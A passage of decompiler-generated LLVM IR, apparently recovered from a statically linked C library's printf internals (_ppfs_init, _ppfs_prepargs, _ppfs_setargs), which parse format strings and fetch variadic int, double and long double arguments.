  uselistorder label %dec_label_pc_805cb15, { 1, 0 }
  uselistorder label %dec_label_pc_805cb0d, { 1, 0 }
  uselistorder label %dec_label_pc_805cab9, { 1, 0 }
  uselistorder label %dec_label_pc_805caae, { 1, 0 }
  uselistorder label %dec_label_pc_805ca84.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805cfbc = load i32, i32* @esi, align 4
  %v0_805cfbd = load i32, i32* @ebx, align 4
  store i32 %v0_805cfbd, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_805cfd1 = bitcast i32* %arg1 to i8*
  %v4_805cfd1 = call i32 @__GI_memset(i8* %v3_805cfd1, i32 0, i32 188)
  %v0_805cfd6 = load i32, i32* @ebx, align 4
  %v1_805cfd6 = add i32 %v0_805cfd6, 40
  store i32 %v1_805cfd6, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_805cfde = add i32 %v0_805cfd6, 24
  %v2_805cfde = inttoptr i32 %v1_805cfde to i32*
  %v3_805cfde = load i32, i32* %v2_805cfde, align 4
  %v4_805cfde = add i32 %v3_805cfde, -1
  store i32 %v4_805cfde, i32* %v2_805cfde, align 4
  %v0_805cfe4 = load i32, i32* @esi, align 4
  %v1_805cfe4 = load i32, i32* @ebx, align 4
  %v2_805cfe4 = inttoptr i32 %v1_805cfe4 to i32*
  store i32 %v0_805cfe4, i32* %v2_805cfe4, align 4
  %v0_805cfe6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805cfe6

dec_label_pc_805cfe6:                             ; preds = %dec_label_pc_805cfe6, %entry
  %v0_805cfe6 = phi i32 [ %v1_805cfec, %dec_label_pc_805cfe6 ], [ %v0_805cfe6.pre, %entry ]
  %v1_805cfe6 = inttoptr i32 %v0_805cfe6 to i32*
  store i32 8, i32* %v1_805cfe6, align 4
  %v0_805cfec = load i32, i32* %eax.global-to-local, align 4
  %v1_805cfec = add i32 %v0_805cfec, 4
  store i32 %v1_805cfec, i32* %eax.global-to-local, align 4
  %v0_805cfef = load i32, i32* %edx.global-to-local, align 4
  %v1_805cfef = add i32 %v0_805cfef, -1
  %v8_805cfef = icmp eq i32 %v1_805cfef, 0
  store i32 %v1_805cfef, i32* %edx.global-to-local, align 4
  %v1_805cff0 = icmp eq i1 %v8_805cfef, false
  br i1 %v1_805cff0, label %dec_label_pc_805cfe6, label %dec_label_pc_805cff2

dec_label_pc_805cff2:                             ; preds = %dec_label_pc_805cfe6
  %v0_805cff2 = load i32, i32* @esi, align 4
  store i32 %v0_805cff2, i32* %eax.global-to-local, align 4
  %v1_805d01d20 = inttoptr i32 %v0_805cff2 to i8*
  %v2_805d01d21 = load i8, i8* %v1_805d01d20, align 1
  %v3_805d01d22 = zext i8 %v2_805d01d21 to i32
  %v5_805d01d23 = and i32 %v1_805cfef, -256
  %v6_805d01d24 = or i32 %v3_805d01d22, %v5_805d01d23
  store i32 %v6_805d01d24, i32* %edx.global-to-local, align 4
  %v4_805d01f25 = icmp eq i8 %v2_805d01d21, 0
  %v1_805d02127 = icmp eq i1 %v4_805d01f25, false
  br i1 %v1_805d02127, label %dec_label_pc_805cffb, label %dec_label_pc_805d023

dec_label_pc_805cffb:                             ; preds = %dec_label_pc_805cff2, %dec_label_pc_805d01d.backedge
  %v6_805d01d30 = phi i32 [ %v6_805d01d, %dec_label_pc_805d01d.backedge ], [ %v6_805d01d24, %dec_label_pc_805cff2 ]
  %v2_805d01d29 = phi i8 [ %v2_805d01d, %dec_label_pc_805d01d.backedge ], [ %v2_805d01d21, %dec_label_pc_805cff2 ]
  %v0_805d00028 = phi i32 [ %v0_805d000.be, %dec_label_pc_805d01d.backedge ], [ %v0_805cff2, %dec_label_pc_805cff2 ]
  %v10_805cffb = icmp eq i8 %v2_805d01d29, 37
  %v1_805cffe = icmp eq i1 %v10_805cffb, false
  br i1 %v1_805cffe, label %dec_label_pc_805d01c, label %dec_label_pc_805d000

dec_label_pc_805d000:                             ; preds = %dec_label_pc_805cffb
  %v1_805d000 = add i32 %v0_805d00028, 1
  store i32 %v1_805d000, i32* %eax.global-to-local, align 4
  %v1_805d001 = inttoptr i32 %v1_805d000 to i8*
  %v2_805d001 = load i8, i8* %v1_805d001, align 1
  %v11_805d001 = icmp eq i8 %v2_805d001, 37
  br i1 %v11_805d001, label %dec_label_pc_805d01c, label %dec_label_pc_805d006

dec_label_pc_805d006:                             ; preds = %dec_label_pc_805d000
  %v1_805d009 = load i32, i32* @ebx, align 4
  %v2_805d009 = inttoptr i32 %v1_805d009 to i32*
  store i32 %v1_805d000, i32* %v2_805d009, align 4
  %v0_805d00b = load i32, i32* @ebx, align 4
  %v1_805d00c = inttoptr i32 %v0_805d00b to i32*
  %v2_805d00c = call i32 @_ppfs_parsespec(i32* %v1_805d00c)
  store i32 %v2_805d00c, i32* %eax.global-to-local, align 4
  %v2_805d014 = icmp slt i32 %v2_805d00c, 0
  br i1 %v2_805d014, label %dec_label_pc_805d027, label %dec_label_pc_805d018

dec_label_pc_805d018:                             ; preds = %dec_label_pc_805d006
  %v0_805d018 = load i32, i32* @ebx, align 4
  %v1_805d018 = inttoptr i32 %v0_805d018 to i32*
  %v2_805d018 = load i32, i32* %v1_805d018, align 4
  %v4_805d01d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805d01d.backedge

dec_label_pc_805d01c:                             ; preds = %dec_label_pc_805d000, %dec_label_pc_805cffb
  %v0_805d01c = phi i32 [ %v1_805d000, %dec_label_pc_805d000 ], [ %v0_805d00028, %dec_label_pc_805cffb ]
  %v1_805d01c = add i32 %v0_805d01c, 1
  br label %dec_label_pc_805d01d.backedge

dec_label_pc_805d01d.backedge:                    ; preds = %dec_label_pc_805d01c, %dec_label_pc_805d018
  %v4_805d01d.be = phi i32 [ %v4_805d01d.pre.pre, %dec_label_pc_805d018 ], [ %v6_805d01d30, %dec_label_pc_805d01c ]
  %v0_805d000.be = phi i32 [ %v2_805d018, %dec_label_pc_805d018 ], [ %v1_805d01c, %dec_label_pc_805d01c ]
  store i32 %v0_805d000.be, i32* %eax.global-to-local, align 4
  %v1_805d01d = inttoptr i32 %v0_805d000.be to i8*
  %v2_805d01d = load i8, i8* %v1_805d01d, align 1
  %v3_805d01d = zext i8 %v2_805d01d to i32
  %v5_805d01d = and i32 %v4_805d01d.be, -256
  %v6_805d01d = or i32 %v3_805d01d, %v5_805d01d
  store i32 %v6_805d01d, i32* %edx.global-to-local, align 4
  %v4_805d01f = icmp eq i8 %v2_805d01d, 0
  %v1_805d021 = icmp eq i1 %v4_805d01f, false
  br i1 %v1_805d021, label %dec_label_pc_805cffb, label %dec_label_pc_805d01d.dec_label_pc_805d023_crit_edge

dec_label_pc_805d01d.dec_label_pc_805d023_crit_edge: ; preds = %dec_label_pc_805d01d.backedge
  %v0_805d023.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d023

dec_label_pc_805d023:                             ; preds = %dec_label_pc_805d01d.dec_label_pc_805d023_crit_edge, %dec_label_pc_805cff2
  %v0_805d023 = phi i32 [ %v0_805d023.pre, %dec_label_pc_805d01d.dec_label_pc_805d023_crit_edge ], [ %v0_805cff2, %dec_label_pc_805cff2 ]
  %v1_805d023 = load i32, i32* @ebx, align 4
  %v2_805d023 = inttoptr i32 %v1_805d023 to i32*
  store i32 %v0_805d023, i32* %v2_805d023, align 4
  br label %dec_label_pc_805d027

dec_label_pc_805d027:                             ; preds = %dec_label_pc_805d006, %dec_label_pc_805d023
  %storemerge = phi i32 [ 0, %dec_label_pc_805d023 ], [ -1, %dec_label_pc_805d006 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805d027 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805d027, i32* @edx, align 4
  %v2_805d028 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d028, i32* @ebx, align 4
  store i32 %v0_805cfbc, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_805d01d, { 1, 0 }
  uselistorder i8 %v2_805d01d, { 1, 2, 0 }
  uselistorder i32 %v0_805d000.be, { 2, 1, 0 }
  uselistorder i32 %v0_805d00028, { 1, 0 }
  uselistorder i32 %v0_805cff2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805cfef, { 0, 2, 1 }
  uselistorder i32 %v1_805cfec, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder label %dec_label_pc_805d027, { 1, 0 }
  uselistorder label %dec_label_pc_805cffb, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805d02c = load i32, i32* @esi, align 4
  %v0_805d02d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805d039 = add i32 %arg1, 24
  %v2_805d039 = inttoptr i32 %v1_805d039 to i32*
  %v3_805d039 = load i32, i32* %v2_805d039, align 4
  %v2_805d03c = add i32 %arg1, 76
  %v3_805d03c = inttoptr i32 %v2_805d03c to i32*
  store i32 %arg2, i32* %v3_805d03c, align 4
  %tmp8 = icmp slt i32 %v3_805d039, 1
  br i1 %tmp8, label %dec_label_pc_805d06a, label %dec_label_pc_805d043

dec_label_pc_805d043:                             ; preds = %entry
  %v1_805d046 = load i32, i32* @ebx, align 4
  %v2_805d046 = add i32 %v1_805d046, 28
  %v3_805d046 = inttoptr i32 %v2_805d046 to i32*
  store i32 %v3_805d039, i32* %v3_805d046, align 4
  %v0_805d049 = load i32, i32* @ebx, align 4
  %v1_805d049 = add i32 %v0_805d049, 24
  %v2_805d049 = inttoptr i32 %v1_805d049 to i32*
  store i32 0, i32* %v2_805d049, align 4
  %v0_805d050 = load i32, i32* @ebx, align 4
  %v1_805d050 = add i32 %v0_805d050, 4
  %v2_805d050 = inttoptr i32 %v1_805d050 to i32*
  store i32 0, i32* %v2_805d050, align 4
  %v0_805d057 = load i32, i32* @ebx, align 4
  %v1_805d057 = add i32 %v0_805d057, 8
  %v2_805d057 = inttoptr i32 %v1_805d057 to i32*
  store i32 0, i32* %v2_805d057, align 4
  %v0_805d05e = load i32, i32* @ebx, align 4
  %v1_805d05f = call i32 @_ppfs_setargs(i32 %v0_805d05e)
  %v1_805d067 = load i32, i32* @ebx, align 4
  %v2_805d067 = add i32 %v1_805d067, 24
  %v3_805d067 = inttoptr i32 %v2_805d067 to i32*
  store i32 %v3_805d039, i32* %v3_805d067, align 4
  br label %dec_label_pc_805d06a

dec_label_pc_805d06a:                             ; preds = %entry, %dec_label_pc_805d043
  %v2_805d06a = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805d02d, i32* @ebx, align 4
  store i32 %v0_805d02c, i32* @esi, align 4
  ret i32 %v2_805d06a

; uselistorder directives
  uselistorder i32 %v3_805d039, { 2, 1, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805d06a, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805d071 = load i32, i32* @ebx, align 4
  store i32 %v0_805d071, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805d076 = add i32 %arg1, 24
  %v2_805d076 = inttoptr i32 %v1_805d076 to i32*
  %v3_805d076 = load i32, i32* %v2_805d076, align 4
  %v4_805d076 = icmp eq i32 %v3_805d076, 0
  %v1_805d07a = add i32 %arg1, 80
  store i32 %v1_805d07a, i32* %ebx.global-to-local, align 4
  %v1_805d07d = icmp eq i1 %v4_805d076, false
  %v1_805d135 = add i32 %arg1, 8
  %v2_805d135 = inttoptr i32 %v1_805d135 to i32*
  %v3_805d135 = load i32, i32* %v2_805d135, align 4
  %v8_805d135 = icmp eq i32 %v3_805d135, -2147483648
  %v1_805d13c = icmp eq i1 %v8_805d135, false
  br i1 %v1_805d07d, label %dec_label_pc_805d135, label %dec_label_pc_805d083

dec_label_pc_805d083:                             ; preds = %entry
  br i1 %v1_805d13c, label %dec_label_pc_805d09d, label %dec_label_pc_805d08c

dec_label_pc_805d08c:                             ; preds = %dec_label_pc_805d083
  %v1_805d08c = add i32 %arg1, 76
  %v2_805d08c = inttoptr i32 %v1_805d08c to i32*
  %v3_805d08c = load i32, i32* %v2_805d08c, align 4
  store i32 %v3_805d08c, i32* %eax.global-to-local, align 4
  %v1_805d08f = add i32 %v3_805d08c, 4
  store i32 %v1_805d08f, i32* %edx.global-to-local, align 4
  store i32 %v1_805d08f, i32* %v2_805d08c, align 4
  %v0_805d095 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d095 = inttoptr i32 %v0_805d095 to i32*
  %v2_805d095 = load i32, i32* %v1_805d095, align 4
  store i32 %v2_805d095, i32* %eax.global-to-local, align 4
  %v1_805d097 = load i32, i32* @ecx, align 4
  %v2_805d097 = add i32 %v1_805d097, 80
  %v3_805d097 = inttoptr i32 %v2_805d097 to i32*
  store i32 %v2_805d095, i32* %v3_805d097, align 4
  %v0_805d09a = load i32, i32* %eax.global-to-local, align 4
  %v1_805d09a = load i32, i32* @ecx, align 4
  %v2_805d09a = add i32 %v1_805d09a, 8
  %v3_805d09a = inttoptr i32 %v2_805d09a to i32*
  store i32 %v0_805d09a, i32* %v3_805d09a, align 4
  %v0_805d09d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805d09d

dec_label_pc_805d09d:                             ; preds = %dec_label_pc_805d083, %dec_label_pc_805d08c
  %v1_805d0ac = phi i32 [ %arg1, %dec_label_pc_805d083 ], [ %v0_805d09d.pre, %dec_label_pc_805d08c ]
  %v1_805d09d = add i32 %v1_805d0ac, 4
  %v2_805d09d = inttoptr i32 %v1_805d09d to i32*
  %v3_805d09d = load i32, i32* %v2_805d09d, align 4
  %v8_805d09d = icmp eq i32 %v3_805d09d, -2147483648
  %v1_805d0a4 = icmp eq i1 %v8_805d09d, false
  br i1 %v1_805d0a4, label %dec_label_pc_805d0b7, label %dec_label_pc_805d0a6

dec_label_pc_805d0a6:                             ; preds = %dec_label_pc_805d09d
  %v1_805d0a6 = add i32 %v1_805d0ac, 76
  %v2_805d0a6 = inttoptr i32 %v1_805d0a6 to i32*
  %v3_805d0a6 = load i32, i32* %v2_805d0a6, align 4
  store i32 %v3_805d0a6, i32* %eax.global-to-local, align 4
  %v1_805d0a9 = add i32 %v3_805d0a6, 4
  store i32 %v1_805d0a9, i32* %edx.global-to-local, align 4
  store i32 %v1_805d0a9, i32* %v2_805d0a6, align 4
  %v0_805d0af = load i32, i32* %eax.global-to-local, align 4
  %v1_805d0af = inttoptr i32 %v0_805d0af to i32*
  %v2_805d0af = load i32, i32* %v1_805d0af, align 4
  store i32 %v2_805d0af, i32* %eax.global-to-local, align 4
  %v1_805d0b1 = load i32, i32* @ecx, align 4
  %v2_805d0b1 = add i32 %v1_805d0b1, 80
  %v3_805d0b1 = inttoptr i32 %v2_805d0b1 to i32*
  store i32 %v2_805d0af, i32* %v3_805d0b1, align 4
  %v0_805d0b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d0b4 = load i32, i32* @ecx, align 4
  %v2_805d0b4 = add i32 %v1_805d0b4, 4
  %v3_805d0b4 = inttoptr i32 %v2_805d0b4 to i32*
  store i32 %v0_805d0b4, i32* %v3_805d0b4, align 4
  %v1_805d12e15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805d0b7

dec_label_pc_805d0b7:                             ; preds = %dec_label_pc_805d09d, %dec_label_pc_805d0a6
  %v1_805d12e15 = phi i32 [ %v1_805d0ac, %dec_label_pc_805d09d ], [ %v1_805d12e15.pre, %dec_label_pc_805d0a6 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805d12e16 = add i32 %v1_805d12e15, 28
  %v3_805d12e17 = inttoptr i32 %v2_805d12e16 to i32*
  %v4_805d12e18 = load i32, i32* %v3_805d12e17, align 4
  %v5_805d13120 = icmp sgt i32 %v4_805d12e18, 0
  br i1 %v5_805d13120, label %dec_label_pc_805d0bb, label %dec_label_pc_805d163.loopexit

dec_label_pc_805d0bb:                             ; preds = %dec_label_pc_805d0b7, %dec_label_pc_805d12d
  %v1_805d12e22 = phi i32 [ %v1_805d12e, %dec_label_pc_805d12d ], [ %v1_805d12e15, %dec_label_pc_805d0b7 ]
  %v1_805d0bb21 = phi i32 [ %v1_805d12d, %dec_label_pc_805d12d ], [ 0, %dec_label_pc_805d0b7 ]
  %v2_805d0bb = mul i32 %v1_805d0bb21, 4
  %v3_805d0bb = add i32 %v2_805d0bb, 40
  %v4_805d0bb = add i32 %v3_805d0bb, %v1_805d12e22
  %v5_805d0bb = inttoptr i32 %v4_805d0bb to i32*
  %v6_805d0bb = load i32, i32* %v5_805d0bb, align 4
  store i32 %v6_805d0bb, i32* %eax.global-to-local, align 4
  %v1_805d0bf = add i32 %v6_805d0bb, -8
  %v9_805d0bf = icmp eq i32 %v1_805d0bf, 0
  br i1 %v9_805d0bf, label %dec_label_pc_805d12d, label %dec_label_pc_805d0c4

dec_label_pc_805d0c4:                             ; preds = %dec_label_pc_805d0bb
  %v10_805d0bf = icmp slt i32 %v1_805d0bf, 0
  %v6_805d0bf = sub i32 7, %v6_805d0bb
  %v7_805d0bf = and i32 %v6_805d0bf, %v6_805d0bb
  %v8_805d0bf = icmp slt i32 %v7_805d0bf, 0
  %v1_805d0c4 = add i32 %v1_805d12e22, 76
  %v2_805d0c4 = inttoptr i32 %v1_805d0c4 to i32*
  %v3_805d0c4 = load i32, i32* %v2_805d0c4, align 4
  store i32 %v3_805d0c4, i32* %edx.global-to-local, align 4
  %v3_805d0c7 = icmp eq i1 %v10_805d0bf, %v8_805d0bf
  br i1 %v3_805d0c7, label %dec_label_pc_805d0d7, label %dec_label_pc_805d0c9

dec_label_pc_805d0c9:                             ; preds = %dec_label_pc_805d0c4
  %tmp13 = icmp slt i32 %v6_805d0bb, 3
  %v9_805d0d0 = icmp eq i32 %v6_805d0bb, 7
  %v1_805d0d3 = icmp eq i1 %v9_805d0d0, false
  %or.cond = or i1 %tmp13, %v1_805d0d3
  br i1 %or.cond, label %dec_label_pc_805d120, label %dec_label_pc_805d102

dec_label_pc_805d0d7:                             ; preds = %dec_label_pc_805d0c4
  %tmp14 = icmp sgt i32 %v6_805d0bb, 1024
  br i1 %tmp14, label %dec_label_pc_805d0e0, label %dec_label_pc_805d120

dec_label_pc_805d0e0:                             ; preds = %dec_label_pc_805d0d7
  %v6_805d0e0 = icmp eq i32 %v6_805d0bb, 2048
  br i1 %v6_805d0e0, label %dec_label_pc_805d0f0, label %dec_label_pc_805d0e7

dec_label_pc_805d0e7:                             ; preds = %dec_label_pc_805d0e0
  %v9_805d0e7 = icmp eq i32 %v6_805d0bb, 2055
  %v1_805d0ec = icmp eq i1 %v9_805d0e7, false
  br i1 %v1_805d0ec, label %dec_label_pc_805d120, label %dec_label_pc_805d111

dec_label_pc_805d0f0:                             ; preds = %dec_label_pc_805d0e0
  %v1_805d0f0 = add i32 %v3_805d0c4, 8
  store i32 %v1_805d0f0, i32* %eax.global-to-local, align 4
  store i32 %v1_805d0f0, i32* %v2_805d0c4, align 4
  %v0_805d0f6 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d0f6 = inttoptr i32 %v0_805d0f6 to i32*
  %v2_805d0f6 = load i32, i32* %v1_805d0f6, align 4
  store i32 %v2_805d0f6, i32* %eax.global-to-local, align 4
  %v1_805d0f8 = add i32 %v0_805d0f6, 4
  %v2_805d0f8 = inttoptr i32 %v1_805d0f8 to i32*
  %v3_805d0f8 = load i32, i32* %v2_805d0f8, align 4
  store i32 %v3_805d0f8, i32* %edx.global-to-local, align 4
  %v1_805d0fb = load i32, i32* %ebx.global-to-local, align 4
  %v2_805d0fb = inttoptr i32 %v1_805d0fb to i32*
  store i32 %v2_805d0f6, i32* %v2_805d0fb, align 4
  %v0_805d0fd = load i32, i32* %edx.global-to-local, align 4
  %v1_805d0fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_805d0fd = add i32 %v1_805d0fd, 4
  %v3_805d0fd = inttoptr i32 %v2_805d0fd to i32*
  store i32 %v0_805d0fd, i32* %v3_805d0fd, align 4
  br label %dec_label_pc_805d12a

dec_label_pc_805d102:                             ; preds = %dec_label_pc_805d0c9
  %v3_805d102 = load i32, i32* %v2_805d0c4, align 4
  store i32 %v3_805d102, i32* %edx.global-to-local, align 4
  %v1_805d105 = add i32 %v3_805d102, 8
  store i32 %v1_805d105, i32* %eax.global-to-local, align 4
  store i32 %v1_805d105, i32* %v2_805d0c4, align 4
  %v0_805d10b = load i32, i32* %edx.global-to-local, align 4
  %v1_805d10b = inttoptr i32 %v0_805d10b to double*
  %v2_805d10b = load double, double* %v1_805d10b, align 4
  %v2_805d10d = load i32, i32* %ebx.global-to-local, align 4
  %v4_805d10d = inttoptr i32 %v2_805d10d to double*
  store double %v2_805d10b, double* %v4_805d10d, align 4
  br label %dec_label_pc_805d12a

dec_label_pc_805d111:                             ; preds = %dec_label_pc_805d0e7
  %v3_805d111 = load i32, i32* %v2_805d0c4, align 4
  store i32 %v3_805d111, i32* %edx.global-to-local, align 4
  %v1_805d114 = add i32 %v3_805d111, 12
  store i32 %v1_805d114, i32* %eax.global-to-local, align 4
  store i32 %v1_805d114, i32* %v2_805d0c4, align 4
  %v0_805d11a = load i32, i32* %edx.global-to-local, align 4
  %v1_805d11a = inttoptr i32 %v0_805d11a to x86_fp80*
  %v2_805d11a = load x86_fp80, x86_fp80* %v1_805d11a, align 4
  %v2_805d11c = load i32, i32* %ebx.global-to-local, align 4
  %v3_805d11c = inttoptr i32 %v2_805d11c to x86_fp80*
  store x86_fp80 %v2_805d11a, x86_fp80* %v3_805d11c, align 4
  br label %dec_label_pc_805d12a

dec_label_pc_805d120:                             ; preds = %dec_label_pc_805d0c9, %dec_label_pc_805d0d7, %dec_label_pc_805d0e7
  %v1_805d120 = add i32 %v3_805d0c4, 4
  store i32 %v1_805d120, i32* %eax.global-to-local, align 4
  store i32 %v1_805d120, i32* %v2_805d0c4, align 4
  %v0_805d126 = load i32, i32* %edx.global-to-local, align 4
  %v1_805d126 = inttoptr i32 %v0_805d126 to i32*
  %v2_805d126 = load i32, i32* %v1_805d126, align 4
  store i32 %v2_805d126, i32* %eax.global-to-local, align 4
  %v1_805d128 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805d128 = inttoptr i32 %v1_805d128 to i32*
  store i32 %v2_805d126, i32* %v2_805d128, align 4
  br label %dec_label_pc_805d12a

dec_label_pc_805d12a:                             ; preds = %dec_label_pc_805d111, %dec_label_pc_805d102, %dec_label_pc_805d0f0, %dec_label_pc_805d120
  %v0_805d12a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805d12a = add i32 %v0_805d12a, 12
  store i32 %v1_805d12a, i32* %ebx.global-to-local, align 4
  %v0_805d12d.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805d12e.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805d12d

dec_label_pc_805d12d:                             ; preds = %dec_label_pc_805d0bb, %dec_label_pc_805d12a
  %v1_805d12e = phi i32 [ %v1_805d12e22, %dec_label_pc_805d0bb ], [ %v1_805d12e.pre, %dec_label_pc_805d12a ]
  %v0_805d12d = phi i32 [ %v1_805d0bb21, %dec_label_pc_805d0bb ], [ %v0_805d12d.pre, %dec_label_pc_805d12a ]
  %v1_805d12d = add i32 %v0_805d12d, 1
  store i32 %v1_805d12d, i32* %esi.global-to-local, align 4
  %v2_805d12e = add i32 %v1_805d12e, 28
  %v3_805d12e = inttoptr i32 %v2_805d12e to i32*
  %v4_805d12e = load i32, i32* %v3_805d12e, align 4
  %v5_805d131 = icmp slt i32 %v1_805d12d, %v4_805d12e
  br i1 %v5_805d131, label %dec_label_pc_805d0bb, label %dec_label_pc_805d12e.dec_label_pc_805d163.loopexit_crit_edge

dec_label_pc_805d135:                             ; preds = %entry
  br i1 %v1_805d13c, label %dec_label_pc_805d14c, label %dec_label_pc_805d13e

dec_label_pc_805d13e:                             ; preds = %dec_label_pc_805d135
  %v1_805d13e = add i32 %arg1, 36
  %v2_805d13e = inttoptr i32 %v1_805d13e to i8*
  %v3_805d13e = load i8, i8* %v2_805d13e, align 1
  %v2_805d142 = zext i8 %v3_805d13e to i32
  %v3_805d142 = mul nuw nsw i32 %v2_805d142, 12
  store i32 %v3_805d142, i32* %eax.global-to-local, align 4
  %v2_805d145 = add i32 %arg1, 68
  %v3_805d145 = add i32 %v2_805d145, %v3_805d142
  %v4_805d145 = inttoptr i32 %v3_805d145 to i32*
  %v5_805d145 = load i32, i32* %v4_805d145, align 4
  store i32 %v5_805d145, i32* %eax.global-to-local, align 4
  store i32 %v5_805d145, i32* %v2_805d135, align 4
  %v0_805d14c.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805d14c

dec_label_pc_805d14c:                             ; preds = %dec_label_pc_805d135, %dec_label_pc_805d13e
  %v1_805d160 = phi i32 [ %arg1, %dec_label_pc_805d135 ], [ %v0_805d14c.pre, %dec_label_pc_805d13e ]
  %v1_805d14c = add i32 %v1_805d160, 4
  %v2_805d14c = inttoptr i32 %v1_805d14c to i32*
  %v3_805d14c = load i32, i32* %v2_805d14c, align 4
  %v8_805d14c = icmp eq i32 %v3_805d14c, -2147483648
  %v1_805d153 = icmp eq i1 %v8_805d14c, false
  br i1 %v1_805d153, label %dec_label_pc_805d163, label %dec_label_pc_805d155

dec_label_pc_805d155:                             ; preds = %dec_label_pc_805d14c
  %v1_805d155 = add i32 %v1_805d160, 37
  %v2_805d155 = inttoptr i32 %v1_805d155 to i8*
  %v3_805d155 = load i8, i8* %v2_805d155, align 1
  %v2_805d159 = zext i8 %v3_805d155 to i32
  %v3_805d159 = mul nuw nsw i32 %v2_805d159, 12
  store i32 %v3_805d159, i32* %eax.global-to-local, align 4
  %v1_805d15c = load i32, i32* %ebx.global-to-local, align 4
  %v2_805d15c = add nsw i32 %v3_805d159, -12
  %v3_805d15c = add i32 %v2_805d15c, %v1_805d15c
  %v4_805d15c = inttoptr i32 %v3_805d15c to i32*
  %v5_805d15c = load i32, i32* %v4_805d15c, align 4
  store i32 %v5_805d15c, i32* %eax.global-to-local, align 4
  store i32 %v5_805d15c, i32* %v2_805d14c, align 4
  %v0_805d163.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805d163

dec_label_pc_805d12e.dec_label_pc_805d163.loopexit_crit_edge: ; preds = %dec_label_pc_805d12d
  br label %dec_label_pc_805d163.loopexit

dec_label_pc_805d163.loopexit:                    ; preds = %dec_label_pc_805d12e.dec_label_pc_805d163.loopexit_crit_edge, %dec_label_pc_805d0b7
  %v1_805d12e.lcssa = phi i32 [ %v1_805d12e, %dec_label_pc_805d12e.dec_label_pc_805d163.loopexit_crit_edge ], [ %v1_805d12e15, %dec_label_pc_805d0b7 ]
  br label %dec_label_pc_805d163

dec_label_pc_805d163:                             ; preds = %dec_label_pc_805d163.loopexit, %dec_label_pc_805d14c, %dec_label_pc_805d155
  %v10_805d16a = phi i32 [ %v1_805d12e.lcssa, %dec_label_pc_805d163.loopexit ], [ %v1_805d160, %dec_label_pc_805d14c ], [ %v0_805d163.pre, %dec_label_pc_805d155 ]
  %v1_805d163 = add i32 %v10_805d16a, 8
  %v2_805d163 = inttoptr i32 %v1_805d163 to i32*
  %v3_805d163 = load i32, i32* %v2_805d163, align 4
  store i32 %v3_805d163, i32* %eax.global-to-local, align 4
  %v2_805d166 = icmp slt i32 %v3_805d163, 0
  %v1_805d168 = icmp eq i1 %v2_805d166, false
  br i1 %v1_805d168, label %dec_label_pc_805d17e, label %dec_label_pc_805d16a

dec_label_pc_805d16a:                             ; preds = %dec_label_pc_805d163
  %v1_805d16a = add i32 %v10_805d16a, 16
  %v2_805d16a = inttoptr i32 %v1_805d16a to i32*
  %v3_805d16a = load i32, i32* %v2_805d16a, align 4
  %v4_805d16a = or i32 %v3_805d16a, 8
  store i32 %v4_805d16a, i32* %v2_805d16a, align 4
  %v0_805d16e = load i32, i32* %eax.global-to-local, align 4
  %v1_805d16e = sub i32 0, %v0_805d16e
  store i32 %v1_805d16e, i32* %eax.global-to-local, align 4
  %v1_805d170 = load i32, i32* @ecx, align 4
  %v2_805d170 = add i32 %v1_805d170, 8
  %v3_805d170 = inttoptr i32 %v2_805d170 to i32*
  store i32 %v1_805d16e, i32* %v3_805d170, align 4
  %v0_805d173 = load i32, i32* @ecx, align 4
  %v1_805d173 = add i32 %v0_805d173, 16
  %v2_805d173 = inttoptr i32 %v1_805d173 to i32*
  %v3_805d173 = load i32, i32* %v2_805d173, align 4
  %v4_805d173 = and i32 %v3_805d173, -2
  store i32 %v4_805d173, i32* %v2_805d173, align 4
  %v0_805d177 = load i32, i32* @ecx, align 4
  %v1_805d177 = add i32 %v0_805d177, 20
  %v2_805d177 = inttoptr i32 %v1_805d177 to i32*
  store i32 32, i32* %v2_805d177, align 4
